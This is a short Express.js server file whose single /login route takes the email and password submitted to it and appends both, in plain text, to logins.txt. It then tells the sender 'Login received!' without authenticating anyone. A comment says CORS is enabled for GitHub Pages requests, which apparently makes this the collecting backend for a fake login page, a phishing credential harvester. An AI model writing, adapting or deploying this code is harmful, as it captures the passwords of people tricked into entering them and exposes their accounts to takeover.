const express = require("express");
const fs = require("fs");
const cors = require("cors");
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors()); // Allow GitHub Pages requests

app.post("/login", (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: "Missing fields" });
    }

    const log = `Time: ${new Date().toISOString()}, Email: ${email}, Password: ${password}\n`;

    fs.appendFile("logins.txt", log, (err) => {
        if (err) console.error("Error saving:", err);
    });

    res.json({ status: "success", message: "Login received!" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on " + PORT));
